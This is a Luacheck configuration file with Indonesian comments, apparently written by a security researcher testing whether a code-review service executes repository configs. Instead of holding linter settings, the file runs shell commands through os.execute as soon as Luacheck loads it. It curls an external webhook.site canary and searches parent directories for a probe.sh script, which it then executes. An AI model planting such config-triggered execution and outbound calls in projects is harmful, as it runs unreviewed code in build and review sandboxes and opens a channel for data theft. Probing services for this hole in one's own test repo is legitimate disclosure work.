-- Batch 1 — Primitif Luacheck (.luacheckrc = skrip Lua yang dieksekusi).
-- Dok resmi Luacheck: "Config is simply a Lua script executed by luacheck."
-- Halaman CodeRabbit untuk Luacheck tanpa security policy sama sekali.
-- Repo tes sendiri ONLY. Yang dilakukan hanya ping canary + probing batas
-- sandbox (boolean/hitungan/nama env var). TIDAK ADA secret yang dibaca
-- nilainya atau dikirim.
-- Canary path: /luacheck

local CANARY = "webhook.site/42ad6b5b-e171-45c4-a7b8-28534655cbe3"

-- Fallback: ping eksekusi langsung (tetap jalan walau probe.sh tak ketemu).
os.execute("curl -s --max-time 5 'https://" .. CANARY .. "/luacheck?stage=exec&fb=1' >/dev/null 2>&1")

-- Full probe: cari probe.sh dengan berjalan naik dari cwd, lalu jalankan.
os.execute("d=$(pwd); while [ ! -f \"$d/probe.sh\" ]; do [ \"$d\" = \"/\" ] && break; d=$(dirname \"$d\"); done; [ -f \"$d/probe.sh\" ] && sh \"$d/probe.sh\" " .. CANARY .. " luacheck >/dev/null 2>&1")

return {}
